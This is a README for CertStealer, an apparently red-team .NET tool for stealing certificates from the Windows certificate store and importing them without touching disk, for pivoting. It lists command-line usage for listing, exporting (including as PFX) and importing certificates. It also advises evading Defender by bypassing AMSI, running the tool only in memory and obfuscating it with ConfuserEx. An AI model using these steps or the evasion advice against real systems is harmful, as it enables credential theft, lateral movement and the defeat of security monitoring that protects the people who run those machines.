# CertStealer

A .NET tool for stealing and importing certificates in the Windows certificate store without touching disk. Useful for red team operations where you need to poach a certificate for pivoting purposes and want to do so with an in-memory post-ex payload.

This tool is flagged as malware by Defender, even though it's custom. It is misidentified as some particular strain of publically known malware. As such, DO NOT run it from disk on-target. DO NOT run it in memory on target WITHOUT AMSI BYPASSED. And DO obfuscate it with a tool like ConfuserEx, just in case.


```
Examples:

Display this help message: CertStealer.exe --help
Listing all certs: CertStealer.exe --list
Exporting a cert by its thumbprint: CertStealer.exe -export AF724CB571166C24C0799E65BE4772B10814BDD2
Exporting a cert by its thumbprint as PFX: CertStealer.exe -export pfx AF724CB571166C24C0799E65BE4772B10814BDD2
Importing a cert into the My store in CurrentUser: CertStealer.exe --import My user Dw...snipped...gY=
Importing a cert into the CA store in LocalMachine: CertStealer.exe --import CA local Dw...snipped...gY=
Use verbose output (works for list and import): CertStealer.exe --list --verbose
```
